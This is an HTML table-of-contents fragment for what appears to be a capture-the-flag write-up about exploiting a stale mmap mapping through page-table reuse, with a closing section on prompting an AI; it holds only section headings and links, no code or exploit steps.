+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#recognizing-the-shape-before-touching-the-binary">Recognizing the shape before touching the binary</a></li><li class="level-3"><a href="#internal-model-recovered-by-re">Internal model recovered by RE</a></li><li class="level-3"><a href="#the-quot-stalemate-quot-one-move-from-won">The &amp;quot;stalemate&amp;quot;: one move from won</a></li><li class="level-3"><a href="#the-bug-a-stale-mmap-mapping">The bug: a stale mmap mapping</a></li><li class="level-3"><a href="#the-collision-page-tables-reuse-the-freed-slot">The collision: page tables reuse the freed slot</a></li><li class="level-3"><a href="#two-gotchas-that-actually-mattered">Two gotchas that actually mattered</a></li><li class="level-3"><a href="#end-to-end-exploit">End-to-end exploit</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     </aside>
 </main>
